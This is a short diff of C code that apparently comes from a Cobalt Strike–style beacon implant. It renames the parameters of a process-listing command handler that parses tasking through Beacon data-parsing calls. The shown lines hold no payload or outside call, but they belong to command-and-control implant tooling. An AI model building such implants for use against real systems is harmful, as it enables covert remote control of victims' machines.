@@ -52,13 +52,13 @@ BOOL IsProcessX64(DWORD pid) {
     return FALSE;
 }
 
-VOID CmdPs(unsigned char* commandBuf, size_t commandBuflen)
+VOID CmdPs(unsigned char* command, size_t command_length)
 {
     char userSid[2048];
     memset(userSid, 0, sizeof(userSid));
 
     datap datap;
-    BeaconDataParse(&datap, commandBuf, commandBuflen);
+    BeaconDataParse(&datap, command, command_length);
     int msgCallBack = BeaconDataInt(&datap);
     BeaconFormatAlloc((formatp*)&datap, 0x8000);
 
